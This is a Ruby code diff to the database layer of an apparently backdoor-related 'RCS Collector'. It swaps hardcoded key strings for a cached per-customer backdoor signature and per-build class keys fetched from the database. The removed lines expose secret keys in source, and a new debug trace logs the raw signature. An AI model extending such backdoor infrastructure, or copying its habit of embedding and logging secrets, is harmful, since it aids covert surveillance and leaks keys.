@@ -12,6 +12,7 @@ require 'rcs-common/trace'
 # system
 require 'digest/md5'
 require 'singleton'
+require 'pp'
 
 module RCS
 module Collector
@@ -37,8 +38,11 @@ class DB
 
     # status of the db connection
     @available = false
-    @cookie = nil
 
+    # global (per customer) backdoor signature
+    @backdoor_signature = nil
+    @class_keys = {}
+    
     # the current db layer to be used is the XML-RPC protocol
     # this will be replaced by DB_rabbitmq
     @db = DB_xmlrpc.new @host
@@ -72,10 +76,17 @@ class DB
     if @available then
       trace :info, "Initializing the DB cache..."
       #TODO: empty the cache and populate it again
+
+      # get the global signature (per customer) for all the backdoors
+      sig = @db.backdoor_signature
+      @backdoor_signature = Digest::MD5.digest sig unless sig.nil? 
+      trace :debug, "Backdoor signature: [#{sig}]"
+
+      # get the classkey of every backdoor and store it in the cache
+      @class_keys = @db.class_keys
     else
       #TODO: check if the cache already exists and has some entries
     end
-    @backdoor_signature = Digest::MD5.digest '4yeN5zu0+il3Jtcb5a1sBcAdjYFcsD9z'
   end
 
   def update_status(status, message)
@@ -92,8 +103,7 @@ class DB
   end
 
   def class_key_of(build_id)
-    #TODO: real query
-    return Digest::MD5.digest '-HcIbnSmrnaXFk6peeZJMx8HFcJPg9Hx'
+    return Digest::MD5.digest @class_keys[build_id] unless @class_keys[build_id].nil?
   end
 
   def status_of(build_id, instance_id, subtype)
